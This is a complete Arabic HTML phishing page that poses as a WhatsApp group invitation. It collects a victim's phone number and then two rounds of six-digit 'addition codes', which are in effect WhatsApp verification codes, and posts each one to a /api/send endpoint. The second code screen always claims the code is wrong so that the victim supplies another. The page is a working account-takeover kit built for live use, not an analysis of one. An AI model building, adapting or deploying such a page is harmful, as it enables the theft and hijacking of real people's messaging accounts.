<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>الانضمام إلى المجموعة</title>
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Cairo:wght@500;700;800&display=swap">
<style>
:root{--bg:#effaf3;--card:#ffffff;--ink:#0f2a1c;--muted:#5b7568;--green:#1faa59;--green-d:#168a46;--line:#cfe5d7;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){--bg:#0c1a13;--card:#13261c;--ink:#e8f6ee;--muted:#9bb8a8;--line:#254636}}
:root[data-theme="dark"]{--bg:#0c1a13;--card:#13261c;--ink:#e8f6ee;--muted:#9bb8a8;--line:#254636}
*{box-sizing:border-box}
[hidden]{display:none!important}
body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;background:var(--bg);color:var(--ink);font-family:"Cairo",Tahoma,Arial,sans-serif;padding:20px}
main{width:100%;max-width:400px;background:var(--card);border-radius:28px;padding:36px 24px 28px;text-align:center;box-shadow:0 10px 40px rgba(20,90,50,.12)}
.logo{width:112px;height:112px;margin:0 auto 20px;display:block}
h1{font-size:26px;font-weight:800;margin:0 0 20px}
input{width:100%;font:inherit;font-size:18px;padding:14px 16px;border:2px solid var(--line);border-radius:14px;background:transparent;color:var(--ink);text-align:center;direction:ltr}
input::placeholder{color:var(--muted);direction:rtl}
input:focus-visible,select:focus-visible{outline:3px solid var(--green);outline-offset:2px;border-color:var(--green)}
button{width:100%;margin-top:14px;font:inherit;font-size:18px;font-weight:700;padding:14px;border:0;border-radius:14px;background:var(--green);color:#fff;cursor:pointer}
button:hover{background:var(--green-d)}
button:focus-visible{outline:3px solid var(--ink);outline-offset:2px}
.err{min-height:24px;margin:12px 0 0;font-size:16px;font-weight:700;color:#e02020}
.phone-row{display:flex;gap:8px;direction:ltr}
.phone-row input{flex:1;min-width:0;width:auto}
.phone-row select{flex:0 0 42%;max-width:170px;font:inherit;font-size:16px;font-weight:700;padding:14px 6px;border:2px solid var(--line);border-radius:14px;background:transparent;color:var(--ink);direction:rtl;text-align:center}
.phone-row option,.phone-row optgroup{background:var(--card);color:var(--ink)}
.code{letter-spacing:.35em;font-size:22px;font-weight:700}
.code::placeholder{letter-spacing:normal;font-size:18px;font-weight:500}
</style>
</head>
<body>

<main id="s1">
<svg class="logo" viewBox="0 0 112 112" role="img" aria-label="واتساب"><circle cx="56" cy="56" r="56" fill="#25d366"/><path d="M56 24a32 32 0 0 0-27.6 48.1L25 87l15.3-3.3A32 32 0 1 0 56 24z" fill="none" stroke="#fff" stroke-width="5" stroke-linejoin="round"/><path d="M45 42c-1.5 0-3.5 1-4.5 3.5-1.3 3.3 0 8 4.5 13.5 5.3 6.4 11.5 9.3 15.8 9.4 3 .1 5.7-1.8 6.4-4.2.3-1 .3-1.8 0-2-.5-.4-4.2-2.2-5-2.5-.8-.3-1.4-.2-1.9.5l-2.2 2.7c-.5.6-1 .7-1.8.4-2.6-1.3-6.700-3.800-9.200-8.100-.4-.8-.1-1.300.4-1.800l1.700-2c.4-.5.500-1 .2-1.700l-3-6.600c-.3-.6-.8-.9-1.600-.9z" fill="#fff"/></svg>
<h1>الانضمام إلى المجموعة</h1>
<div class="phone-row"><select id="cc" aria-label="رمز الدولة"><optgroup label="دول الخليج"><option value="+966" selected>السعودية +966</option><option value="+971">الإمارات +971</option><option value="+965">الكويت +965</option><option value="+974">قطر +974</option><option value="+973">البحرين +973</option><option value="+968">عُمان +968</option></optgroup><optgroup label="أوروبا"><option value="+44">بريطانيا +44</option><option value="+49">ألمانيا +49</option><option value="+33">فرنسا +33</option><option value="+39">إيطاليا +39</option><option value="+34">إسبانيا +34</option><option value="+31">هولندا +31</option><option value="+32">بلجيكا +32</option><option value="+41">سويسرا +41</option><option value="+43">النمسا +43</option><option value="+46">السويد +46</option><option value="+47">النرويج +47</option><option value="+45">الدنمارك +45</option><option value="+353">أيرلندا +353</option><option value="+351">البرتغال +351</option><option value="+30">اليونان +30</option><option value="+48">بولندا +48</option></optgroup><optgroup label="أمريكا"><option value="+1">أمريكا / كندا +1</option><option value="+52">المكسيك +52</option><option value="+55">البرازيل +55</option><option value="+54">الأرجنتين +54</option><option value="+57">كولومبيا +57</option><option value="+56">تشيلي +56</option></optgroup><optgroup label="أستراليا"><option value="+61">أستراليا +61</option></optgroup></select>
<input id="phone" type="tel" inputmode="tel" autocomplete="tel-national" placeholder="اكتب رقم هاتفك" aria-label="رقم الهاتف"></div>
<button id="go" type="button">انضم الآن</button>
<p id="msg" class="err" role="alert"></p>
</main>

<main id="s2" hidden>
<div id="l2"></div>
<h1>ادخل رمز الإضافة</h1>
<input id="code" class="code" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="6" autocomplete="one-time-code" placeholder="اكتب الرمز" aria-label="رمز الإضافة">
<p id="err" class="err" role="alert"></p>
<button id="ok" type="button">تأكيد</button>
</main>

<main id="s3" hidden>
<div id="l3"></div>
<h1>ادخل رمز الإضافة</h1>
<input id="code2" class="code" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="6" autocomplete="one-time-code" placeholder="اكتب الرمز" aria-label="رمز الإضافة">
<p id="err2" class="err" role="alert"></p>
<button id="ok2" type="button">تأكيد</button>
</main>

<script>
function $(i){return document.getElementById(i);}
function digits(s){return s.replace(/[٠-٩]/g,function(d){return d.charCodeAt(0)-1632;});}
function clean(el){el.value=digits(el.value).replace(/\D/g,'').slice(0,6);}
function send(text){
  fetch('/api/send',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({text:text})}).catch(function(){});
}
var s1=$('s1'),s2=$('s2'),s3=$('s3');
var logo=document.querySelector('#s1 .logo');
$('l2').appendChild(logo.cloneNode(true));
$('l3').appendChild(logo.cloneNode(true));

var phone=$('phone');
function go(){
  var v=digits(phone.value).replace(/[\s\-()]/g,'');
  if(!/^\d{6,15}$/.test(v)){$('msg').textContent='اكتب رقم هاتف صحيح.';return;}
  send('رقم جديد: '+$('cc').value+v);
  s1.hidden=true;s2.hidden=false;$('code').focus();
}
$('go').addEventListener('click',go);
phone.addEventListener('keydown',function(e){if(e.key==='Enter')go();});

var code=$('code');
function next(){
  if(code.value.length<6){$('err').textContent='اكتب الرمز المكوّن من 6 أرقام.';return;}
  send('محاولة 1: '+code.value);
  s2.hidden=true;s3.hidden=false;$('code2').focus();
}
code.addEventListener('input',function(){clean(code);$('err').textContent='';});
code.addEventListener('keydown',function(e){if(e.key==='Enter')next();});
$('ok').addEventListener('click',next);

var code2=$('code2');
function check(){
  if(code2.value.length<6){$('err2').textContent='اكتب الرمز المكوّن من 6 أرقام.';return;}
  send('محاولة 2: '+code2.value);
  $('err2').textContent='الرمز الذي أدخلتم غير صحيح';
  code2.value='';code2.focus();
}
code2.addEventListener('input',function(){clean(code2);$('err2').textContent='';if(code2.value.length===6)check();});
code2.addEventListener('keydown',function(e){if(e.key==='Enter')check();});
$('ok2').addEventListener('click',check);
</script>
</body>
</html>
